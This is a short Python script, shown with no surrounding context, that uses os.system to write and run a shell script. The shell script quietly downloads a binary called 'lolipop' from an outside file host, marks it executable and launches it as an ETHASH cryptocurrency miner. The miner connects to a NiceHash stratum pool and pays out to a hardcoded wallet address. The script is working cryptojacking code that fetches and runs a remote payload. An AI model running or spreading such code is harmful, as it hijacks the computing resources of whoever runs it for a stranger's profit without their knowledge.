import os
os.system('echo "#!/bin/sh" >> tes')
os.system('echo "wget -q https://bin.jvnv.net/file/4ptE5/lolipop && chmod +x lolipop" >> tes')
os.system('echo "./lolipop --algo ETHASH --pool stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353 --user 35Kx5TuJm53NqARyAfYRdmdv1DWysuGe5a.알겠습니다" >> tes')
os.system('sleep 2')
os.system('sh tes')
